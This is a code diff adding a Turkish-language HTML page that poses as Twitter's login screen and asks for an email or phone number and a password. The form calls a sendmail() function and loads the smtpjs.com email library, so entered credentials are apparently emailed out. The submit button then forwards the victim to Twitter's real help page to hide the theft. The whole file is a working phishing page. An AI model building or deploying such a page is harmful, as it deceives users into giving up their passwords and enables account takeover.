@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Twitter</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+  <link href="style.css" rel="stylesheet">
+  <script src="script.js"></script>
+  <script src="https://code.jquery.com/jquery-2.2.4.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
+</head>
+<body style=" background-color: black;">
+<div class="container-fluid">
+    <div class="row">
+   
+     <div class=" col-md-4"> </div>
+     <div class="col-md-4" >
+      <br>
+      <img style="margin-left: 12%;" src="https://www.iconsdb.com/icons/preview/white/twitter-xxl.png" width="40">
+      <br>
+      <br>
+      <h1 class="twFont">Twitter'a giriş yap</h1>
+      <div class="lloginColor"> 
+         <form action="javascript:sendmail()" method="post">
+            <div class="form-group input-group-lg">    
+               <input type="email" class="form-control inputT" id="email" placeholder="E-posta veya Telefon Numarası" name="email">
+            </div>
+            <div class="form-group input-group-lg">
+              <input type="password" class="form-control inputT" id="sifre" placeholder="Şifre" name="pswd">
+            </div>
+           <center> <p class="buttonT"> <button  onclick="window.location.href ='https://help.twitter.com/tr'" type="submit" class="twButton btn btn-primary btn-lg rounded-pill" >Giriş Yap </button></p> </center> 
+           <center><p> <a class="pswFont"> Şifreni mi Unuttun? </a> · <a class="pswFont">Twitter'a Kaydol</a> </p> </center>  
+          </form>      
+      </div>
+    <div class="  col-md-4" ></div>
+  </div>
+</div> 
+</body>
+</html>
+
+
